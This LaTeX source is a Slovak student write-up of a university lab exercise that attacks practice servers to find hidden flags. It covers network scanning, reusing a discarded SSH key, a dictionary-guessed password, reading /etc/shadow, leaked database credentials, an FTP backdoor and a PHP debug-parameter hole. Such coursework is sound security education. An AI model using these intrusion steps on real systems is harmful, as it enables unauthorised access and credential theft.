\documentclass[11pt,a4paper]{article}

\usepackage[left=2cm,text={17cm,24cm},top=3cm]{geometry}
\usepackage[slovak]{babel}
\usepackage[utf8]{inputenc}
\usepackage[T1]{fontenc}

\usepackage{url}
\usepackage{tikz}
\usepackage{float}
\usepackage{xcolor}
\usepackage{siunitx}
\usepackage{listings}
\usepackage{csquotes}
\usepackage{hyperref}
\usepackage{textcomp}
\usepackage{breakurl}
\usepackage{etoolbox}
\usepackage{graphicx}
\usepackage{multicol}
\usepackage{multirow}
\usepackage{enumerate}
\usepackage{supertabular}
\usepackage[titles]{tocloft}

\def\UrlBreaks{\do\/\do-}
\newcommand{\red}[1]{\textcolor{red}{#1}}
\newcommand{\tilda}{\raisebox{0.5ex}{\texttildelow}}
\renewcommand{\cftdot}{}

\graphicspath{{img/}}
\setlength\parindent{0pt}
\patchcmd{\thebibliography}{\section*{\refname}}{}{}{}

\begin{document}

\begin{titlepage}
    \begin{center}
        \Huge
        \textsc{
            Fakulta informačních technologií\\
            Vysoké učení technické v~Brně
        }
        \vspace{80px}
        \begin{figure}[!h]
            \centering
            \includegraphics[scale=0.3]{vutbr-fit-logo.eps}
        \end{figure}
        \\[15mm]
        \Huge{
            \textbf{
                BIS
            }
        }
        \\[1.5mm]
        \huge{
            \textbf{
                Bezpečnost informačních systémů
            }
        }
        \\[2.5em]
        \LARGE{
            \textbf{
                Tajomstvo BIS
            }
        }
        \vfill
    \end{center}
        \Large{
            Adrián Tóth (xtotha01)\hfill \today
        }
\end{titlepage}

\setlength{\parskip}{0pt}
\hypersetup{hidelinks}\tableofcontents
\setlength{\parskip}{0pt}

\newpage
\section{Úvod}

Cieľom projektu bolo uskutočniť APT útok na zadaný server. Výsledok útoku spočíval v odhalení všetkých tajomstiev ktoré boli poukrývané na rôznych miestach. Nasledujúce kapitoly popisujú proces hľadania jednotlivých tajomstiev po pripojení pomocou privátneho kľúča na \textit{bis.fit.vutbr.cz}.

\section{Tajomstvá}

\begin{tabular}{r|l}
    Kapitola \ref{sec:A} & \footnotesize{\texttt{A\_20-11-16-10-01\_2808ed0cf1d2ad2024a572ae6075f14cbe9c4e5103493dc088cf846d0ffa9f0d}} \\
    Kapitola \ref{sec:B} & \footnotesize{\texttt{B\_21-11-22-59-01\_fd5e5384449c8f7210aeae754d02913a70e3b0cc52e933ab18dec768a6c346b0}} \\
    Kapitola \ref{sec:C} & \footnotesize{\texttt{C\_17-11-19-41-01\_47533bc4b523ba4f7d0ebef3d25fe654f5ec126bc6a161394b027f4355ed6f64}} \\
    Kapitola \ref{sec:D} & \footnotesize{\texttt{D\_20-11-14-50-01\_167443c9a637757e4f3a88a71d43db93a5a7a53bdb449958ff4d91a8ee87b034}} \\
    Kapitola \ref{sec:E} & \footnotesize{\texttt{E\_17-11-20-44-01\_6454d0f7031b689cccb1bedf8de6f6c0b904eeaa810d7aef98bab5cba308fafe}} \\
    Kapitola \ref{sec:F} & \footnotesize{\texttt{F\_18-11-22-13-01\_2d04f2e14d44efadf60e1921b8902d2648c65dfe364dbc0cb23da17d4008cf62}} \\
    Kapitola \ref{sec:G} & \footnotesize{\texttt{G\_20-11-15-40-01\_33582fcbcfaf70b70a85dd974c6831aad199fc150b7cc77c2fefaf59e87f9e4e}} \\
    Kapitola \ref{sec:H} & \footnotesize{\texttt{H\_20-11-21-32-01\_e611160adcc74100c8739ad2525739abda3bdc39e471efdb5b27a01a32d0c32c}} \\
    Kapitola \ref{sec:I} & \footnotesize{\texttt{I\_17-11-20-14-01\_adb2020a691f94c4a2b0f3ea1b16c21936567ee6b07f5a3308959c47a1b19abe}} \\
    Kapitola \ref{sec:J} & \footnotesize{\texttt{J\_20-11-22-38-01\_2a87a2c2ad810dfd8d839eae1216c65732cb84a896b730c4ed77c3be966f790f}} \\
\end{tabular}

\hfill\\

Jednotlivé kapitoly popisujúce odhalené tajomstvá sú usporiadané do kapitol na základe poradia odhalenia jednotlivých tajomstiev.

\section{Analýza}\label{sec:analysis}

Po pripojení na \textit{bis.fit.vutbr.cz} som si najskôr prezrel \texttt{\$HOME} pomocou \uv{\texttt{ls -R -A \$HOME}}. Odhalil som v priečinku \texttt{.Trash} privátny kľúč používateľa \textit{itcrowd}. Následne na to, som si zistil IP adresu zariadenia pomocou \uv{\texttt{ip addr}}. IP adresa zariadenia: \texttt{192.168.122.6}, maska siete: \texttt{255.255.255.0}. Zanalyzoval som si sieť v ktorej sa nachádza toto zariadenie pomocou \uv{\texttt{nmap 192.168.122.6/24 -Pn}}. Vo výstupe som spozoroval \textit{ptest}, tak na základe tohto, som spustil príkaz \uv{\texttt{nmap 192.168.122.6/24 -Pn | grep -A 6 "ptest"}}. Získal som nasledujúci výsledok:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\small]
Nmap scan report for ptest1.bis.mil (192.168.122.143)
Host is up (0.00072s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh

Nmap scan report for ptest2.bis.mil (192.168.122.27)
Host is up (0.00049s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
\end{lstlisting}
\end{tabular}
\end{center}

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\small]
Nmap scan report for ptest3.bis.mil (192.168.122.22)
Host is up (0.00062s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
111/tcp open  rpcbind

Nmap scan report for ptest4.bis.mil (192.168.122.210)
Host is up (0.0016s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
6667/tcp open  irc
\end{lstlisting}
\end{tabular}
\end{center}

Z týchto poznatkov som zvážil, že by som sa pomocou odhaleného kľúča mohol vedieť pripojiť na jeden z hore uvedených zariadení. Popis pripojenia pomocou tohto privátneho kľuča pokračuje v kapitole \ref{sec:C}.

\section{Tajomstvo \textit{C}}\label{sec:C}

S využitím privátneho kľúča v priečinku \texttt{\$HOME/.Trash/itcrowd.key} pre používateľa \textit{itcrowd} nachadzájúceho sa na \textit{bis.fit.vutbr.cz} som sa pripojil na zariadenie \texttt{ptest3} pomocou príkazu \uv{\texttt{ssh -i .Trash/itcrowd.key -l itcrowd ptest3}}.\\

Po úspešnom pripojení som si znovu preskúmal \texttt{\$HOME} pomocou \uv{\texttt{ls -R -A \$HOME}}. Keďže na \textit{ptest3} je otvorený port \textit{http}, tak som vykonal \uv{\texttt{cd /var/www/html \&\& ls -R -A .}}. Spozoroval som súbor \texttt{/var/www/html/secret.txt} ktorého obsah som si následne chcel vypísať pomocou \uv{\texttt{cat secret.txt}}. Výpis nebol možný z dôvodu nedostatočných práv, t.j.:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
cat: /var/www/html/secret.txt: Permission denied
\end{lstlisting}
\end{tabular}
\end{center}

Port \textit{http} bol ale otvorený, tak som skúsil zda sa ten súbor neviem stiahnuť pomocou \uv{\texttt{curl http://\\ptest3/secret.txt}}.

\begin{center}
\small{\texttt{Ziskali jste tajemstvi C\_17-11-19-41-01\_47533bc4b523ba4f7d0ebef3d25fe654f5ec126bc6a161394b027f4355ed6f64}}
\end{center}

\section{Tajomstvo \textit{I}}\label{sec:I}

Tajomstvo \textit{I} som získal pokračovaním v analýze priečinka \texttt{/var/www/html} po odhalení tajomstva \textit{C} ktoré je popísané v kapitole \ref{sec:C}. Pri vypísaní obsahu súbora \texttt{/var/www/html/robots.txt} pomocou \uv{\texttt{cat /var/www/html/robots.txt}} som získal tajomstvo \textit{I}.

\begin{center}
\small{\texttt{Ziskali jste tajemstvi I\_17-11-20-14-01\_adb2020a691f94c4a2b0f3ea1b16c21936567ee6b07f5a3308959c47a1b19abe}}
\end{center}

\section{Tajomstvo \textit{E}}\label{sec:E}

Pri pripojení na zariadenie \texttt{ptest3} pomocou príkazu \uv{\texttt{ssh -i .Trash/itcrowd.key -l itcrowd ptest3}} sa zobrazila uvítacia správa ktorá obsahova \textit{Riddle of the day}:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
===== Riddle of the day =====
|>Qefkdp xob klq xitxvp texq qebv pbbj; qeb cfopq xmmbxoxkzb abzbfsbp jxkv;
qeb fkqbiifdbkzblc x cbt mbozbfsbp texq exp ybbk zxobcriiv efaabk.<|
|>Ql zixfj vlro mofwb ork zljjxka: ofaaib bppbkqfxifqfbp<|
=============================
\end{lstlisting}
\end{tabular}
\end{center}

Zistil som, že sa jedná o Caesarovau šifru s pousnutím o 23. Dekódovaná správa vyzerala následovne:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
===== Riddle of the day =====
|>Things are not always what they seem the first appearance deceives many;
the intelligence of a few perceives what has been carefully hidden.<|
|>To claim your prize run command: riddle essentialities<|
=============================
\end{lstlisting}
\end{tabular}
\end{center}

Po vykonaní príkazu \uv{\texttt{riddle essentialities}} som získal tajomstvo \textit{E}.

\begin{center}
\small{\texttt{Ziskali jste tajemstvi E\_17-11-20-44-01\_6454d0f7031b689cccb1bedf8de6f6c0b904eeaa810d7aef98bab5cba308fafe}}
\end{center}

\section{Tajomstvo \textit{F}}\label{sec:F}

Všimol som si po analýze siete ktorá je popísaná v kapitole \ref{sec:analysis}, že na \textit{ptest4} beží \texttt{irc} na porte \texttt{6667}. Spustil som si IRC client pomocou \uv{\texttt{irssi}} a následne som sa napojil na \textit{ptest4} pomocou \uv{\texttt{/connect ptest4}}. Vypísal som si zoznam kanálov (channels) pomocou \uv{\texttt{/list}}.

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
20:20 -!- Channel Users  Name
20:20 -!- #bis 1
20:20 -!- &SERVER 0 Server Messages
20:20 -!- #anonbox 0 Post all your ideas, complaints and everyday issues.
20:20 -!- #itcrowd 0 All IT issues to be discussed here.
20:20 -!- #meetings 0 In this channel you can find transcripts of the meetings.
20:20 -!- #finances 0 Channel for accountants and all monetary operations.
20:20 -!- #internal 1 Internal affairs.
20:20 -!- #general 0 Feel free discuss various topics in here.
20:20 -!- End of LIST
\end{lstlisting}
\end{tabular}
\end{center}

Všimol som si že na kanále \texttt{\#bis} sa nachádza 1 user (používateľ). Pripojil som sa na kanál \texttt{\#bis} a vypísal som si mená na tomto kanály pomocou \uv{\texttt{/names}}.

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
20:26 [Users #bis]
20:26 [@Willie] [ student]
20:26 -!- Irssi: #bis: Total of 2 nicks [1 ops, 0 halfops, 0 voices, 1 normal]
\end{lstlisting}
\end{tabular}
\end{center}

Zistil som že \texttt{@Willie} je bot z {\color{blue}\href{https://github.com/mikeywaites/willie}{github.com/mikeywaites/willie}} a má reagovať na určité príkazy začínajúce s bodkou. Zadal som príkaz \uv{\texttt{.commands}} na ktorý mi bot reagoval:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
20:49 <@Willie> student: I am sending you a private message of all my commands!
\end{lstlisting}
\end{tabular}
\end{center}

Otvoril som si privátny chat s botom kde mi \texttt{@Willie} poslal všetky príkazy:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[language={}, basicstyle=\footnotesize]
20:49 <Willie> Commands I recognise: CUKOO, action, addtrace, addtraceback, agreed,
announce, ask, at, ban, bitcoin, blocks, btc, c, calc, ch, chairs, choice, choose,
commands, comment, comments, countdown, cukoo, cur, currency, d, ddg, define, deop,
devoice, dice, dict, distance, duck, endmeeting, ety, exchange, findbug, findissue,
g, getchanneltimeformat, getchanneltz, getctf, getctz, getsafeforwork, getsfw,

20:49 <Willie> gettf, gettimeformat, gettimezone, gettz, gify, gtfy, help, imdb,
in, info, ip, iplookup, isup, join, kb, kick, kickban, length, link, listactions,
lmgify, lmgtfy, load, makebug, makeissue, mangle, mangle2, mass, me, mode, movie,
msg, op, part, py, quiet, quit, radio, rand, redditor, reload, roll, rss, safety,
save, search, seen, set, setchanneltimeformat, setchanneltz, setctf, setctz,

20:49 <Willie> setlocation, setsafeforwork, setsfw, settf, settimeformat,
settimezone, settz, setwoeid, showmask, spell, spellcheck, startmeeting, subject,
suggest, t, tell, temp, time, title, tld, tmask, topic, tr, translate, u, unban,
unquiet, update, uptime, version, voice, w, wa, wea, weather, weight, wik, wiki,
wolfram, wt, xkcd.

20:49 <Willie> For help, do 'Willie: help example' where example is the name of
the command you want help for.
\end{lstlisting}
\end{tabular}
\end{center}

Ukončil som privátny chat pomocou príkazu \uv{\texttt{/q}} aby som sa vrátil naspať do kanála \texttt{\#bis}. Napísal som príkaz \uv{\texttt{.CUKOO}} (podozrivý príkaz pretože nepatrí medzi bežné príkazy bota) na ktorý mi ale bot nereagoval, vyskúšal som \uv{\texttt{.help CUKOO}} na čo reagoval:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
20:56 <@Willie> student: I might spoil you a secret.
\end{lstlisting}
\end{tabular}
\end{center}

Znovu som si otvoril privátny chat s botom kde som vyskúšal \uv{\texttt{.CUKOO}} na čo bot reagoval správou:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
21:13 <Willie> Ziskali jste tajemstvi
F_18-11-22-13-01_2d04f2e14d44efadf60e1921b8902d2648c65dfe364dbc0cb23da17d4008cf62

21:13 <Willie> Ziskali jste tajemstvi
F_18-11-22-13-01_2d04f2e14d44efadf60e1921b8902d2648c65dfe364dbc0cb23da17d4008cf62
\end{lstlisting}
\end{tabular}
\end{center}

V správe som získal tajomstvo \textit{F}.

\begin{center}
\small{\texttt{Ziskali jste tajemstvi F\_18-11-22-13-01\_2d04f2e14d44efadf60e1921b8902d2648c65dfe364dbc0cb23da17d4008cf62}}
\end{center}

\section{Tajomstvo \textit{D}}\label{sec:D}

Keďže na \textit{ptest4} je otvorený port 53, vyskúšal som dotazovanie nie skutočného DNS servera - 192.168.122.1, ale DNS servera \textit{ptest4} - \texttt{192.168.122.210} pomocou \texttt{dig}. Pomocou príkazu \uv{\texttt{dig @192.168.122.210 ptest4.bis.mil. ANY}} som zistil NS záznam pre \texttt{ptest4.bis.mil} t.j. \texttt{bis.mil.} bol NS pre \texttt{ptest4.bis.mil}. Následne som znovu poslal dotaz na \textit{ptest4} pomocou \uv{\texttt{dig @192.168.122.210 bis.mil ANY}}. Odhalil som, že tajomstvo sa nachádza v TXT zázname. Poslal som dotaz \uv{\texttt{dig @192.168.122.210 bis.mil TXT}} ktorý mi vypísal tajomstvo \textit{D}.

\begin{center}
\small{\texttt{Ziskali jste tajemstvi D\_20-11-14-50-01\_167443c9a637757e4f3a88a71d43db93a5a7a53bdb449958ff4d91a8ee87b034}}
\end{center}

\section{Tajomstvo \textit{G}}\label{sec:G}

Na \textit{ptest1} bol otvorený FTP port. Vyskúšal som sa pripojiť ale bez správneho prihlasovacieho mena a hesla ma to nechcelo pripojiť. FTP server ale obsahoval backdoor, ktorý fungoval tak, že som musel do prihlasovacieho mena vložiť podreťazec \uv{\textit{:)}} reprezentujúci smajlík a náhodné heslo. Výsledkom bola odpoveď \uv{\texttt{220 Opened port 50331, take a look ;)}} ktorú som využil tak, že som sa znovu pripojil pomocou príkazu \uv{\texttt{ftp 192.168.122.143 56530}}. Odhalil som tajomstvo \textit{G}.

\begin{center}
\small{\texttt{Ziskali jste tajemstvi G\_20-11-15-40-01\_33582fcbcfaf70b70a85dd974c6831aad199fc150b7cc77c2fefaf59e87f9e4e}}
\end{center}

\section{Tajomstvo \textit{A}}\label{sec:A}

V priečinku \texttt{\$HOME/Documents} sa nachádzali 4 súbory ktoré som odhalil analýzou, ktorá je popísaná v kapitole \ref{sec:analysis}. V jednom z nich - \texttt{\path{$HOME/Documents/tc48-2008-024-Rev4.pdf}} som našiel využiteľnú informáciu - \uv{\textit{Jen Barber, jbarber@ptest1.bis.mil}}, ktorú som odhalil tak, že dostupné zariadenia pri analýze siete (viz kapitola \ref{sec:analysis}) obsahovali reťazec \textit{ptest} a tento email obsahoval slovo \textit{ptest}. Na \textit{ptest1} bol otvorený SSH port tak som sa pokúsil pripojiť pomocou príkazu \uv{\texttt{ssh jbarber@ptest1.bis.mil}} ktoré ale vyžadovalo heslo. Heslo som pomocou metódy brute force a pomocou 50 najčastejších hesiel t.j. slovníkový útok, hneď odhalil - \uv{\texttt{welcome}}. Pripojil som sa ako \textit{jbarber} s heslom \textit{welcome}. Po pripojení som začal analyzovať obsah \texttt{\$HOME} priečinka a následne som prezrel obsah \texttt{/etc/passwd} a \texttt{/etc/shadow}. Tajomstvo \textit{A} sa nachádzalo v \texttt{/etc/shadow} (v poli pre heslo).

\begin{center}
\small{\texttt{Ziskali jste tajemstvi A\_20-11-16-10-01\_2808ed0cf1d2ad2024a572ae6075f14cbe9c4e5103493dc088cf846d0ffa9f0d}}
\end{center}

\section{Tajomstvo \textit{H}}\label{sec:H}

Analýzou priečinka \texttt{\$HOME} po pripojení na \textit{ptest1} (pripojenie na \textit{ptest1} je popísane v kapitole \ref{sec:A}) som odhalil tajomstvo \textit{H} v jednom zo súborov v podpriečinku \texttt{\$HOME}. Tajomstvo \textit{H} sa nachádzalo v súbore \texttt{\$HOME/Mail/Trash} ktoré som získal pomocou \uv{\texttt{cat \$HOME/Mail/Trash}}.

\begin{center}
\small{\texttt{Ziskali jste tajemstvi H\_20-11-21-32-01\_e611160adcc74100c8739ad2525739abda3bdc39e471efdb5b27a01a32d0c32c}}
\end{center}

\section{Tajomstvo \textit{J}}\label{sec:J}

Pri analýze priečinka \texttt{\$HOME} ktorý je spomenutý v kapitole \ref{sec:C} som odhalil v priečinku \texttt{.ssh} rôzne kľúče. Pomocou \uv{\texttt{cat .ssh/config}} som zistil, že používateľ \textit{webmaster} má prístup na \textit{ptest2.bis.mil}. Vyskúšal som sa pripojiť na \textit{ptest2} ako \textit{webmaster} pomocou \uv{\texttt{ssh webmaster@ptest2.bis.mil}}. Prihlásnie prebehlo úspešne. Analýzou spomenutej v kapitole \ref{sec:analysis} som vedel, že tu je otvorený port pre HTTP a MySQL. Zanalyzoval som priečinky zariadenia, hlavne \texttt{/var/www/html} kde som našiel rôzne súbory. Po dôkladnejšom preskúmaní som odhalil prihlasovacie údaje do databázy v súbore \texttt{libs/constants.php} pomocou \uv{\texttt{cat libs/constants.php}}.

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
define('DB_DRIVER', 'mysql');
define('DB_HOST', 'localhost');
define('DB_HOST_USERNAME', 'arcturus');
define('DB_HOST_PASSWORD', '16431879196842');
define('DB_DATABASE', 'arcturus');
\end{lstlisting}
\end{tabular}
\end{center}

 Pripojil som sa do databázy pomocou \uv{\texttt{mysql -u arcturus -p16431879196842}}. Zanalyzoval som obsah databázy príkazmy \uv{\texttt{use <DB>;}} a \uv{\texttt{select * from <table>}}. Databáza \texttt{arcturus} obsahovala tabuľku \texttt{contracts} ktorá obsahovala tajomstvo \textit{J}.

\begin{center}
\small{\texttt{J\_20-11-22-38-01\_2a87a2c2ad810dfd8d839eae1216c65732cb84a896b730c4ed77c3be966f790f}}
\end{center}


\section{Tajomstvo \textit{B}}\label{sec:B}

Pokračovaním analýzi prečinka \texttt{/var/www/html} na \textit{ptest2} (pripojenie na \textit{ptest2} je popísané v kapitole \ref{sec:J}) som odhalil implementačnú zraniteľnosť.
Pomocou príkazu \uv{\texttt{cat index.php}} som odhalil zraniteľnosť v zdrojovom kóde:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
/* TODO: DEVELOPMENT ONLY, REMOVE IN PRODUCTION!!!
 *
 * Prints out value of a variable specified by GET parameter debug_variable
 */
if (isset($_GET['debug_variable'])) {
  var_dump(${$_GET['debug_variable']});
};
\end{lstlisting}
\end{tabular}
\end{center}

Na základe tejto zraniteľnosti ktorá bola dokonca i popísaná som sa snažil nájsť nejakú premennú ktorú by sa dalo vypísať pomocou tejto zraniteľnosti. Po ďalšej analýze ostatných zdrojových kódov ma zaujal súbor \texttt{internal-memo.php}. Pomocou príkazu \uv{\texttt{cat internal-memo.php}} som odhalil:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
<?php echo $GLOBALS['INTERNAL_MSG']; ?>
\end{lstlisting}
\end{tabular}
\end{center}

Teraz som potreboval preniesť túto premennú do odhaleného zranitelného miesta. Dotaz \uv{\texttt{curl http://\\ptest2/index.php}} nefungoval, ale po správnom dotaze pomocou \uv{\texttt{curl http://ptest2/index.php?\\debug\_variable=INTERNAL\_MSG}} som si premennú ypísal:

\begin{center}
\begin{tabular}{c}
\begin{lstlisting}[basicstyle=\footnotesize]
string(104) "Ziskali jste tajemstvi
B_21-11-22-59-01_fd5e5384449c8f7210aeae754d02913a70e3b0cc52e933ab18dec768a6c346b0"
<!DOCTYPE HTML>
<html>
    <head>
        <title>Project Arcturus Home - Project Arcturus</title>
...
\end{lstlisting}
\end{tabular}
\end{center}

Odhalil som tajomstvo \textit{B}.

\begin{center}
\small{\texttt{Ziskali jste tajemstvi B\_21-11-22-59-01\_fd5e5384449c8f7210aeae754d02913a70e3b0cc52e933ab18dec768a6c346b0}}
\end{center}

%\newpage
%\section{Literatúra}
%\bibliographystyle{slovakiso}
%\begin{flushleft}
%    \bibliography{quotation}
%\end{flushleft}

\end{document}
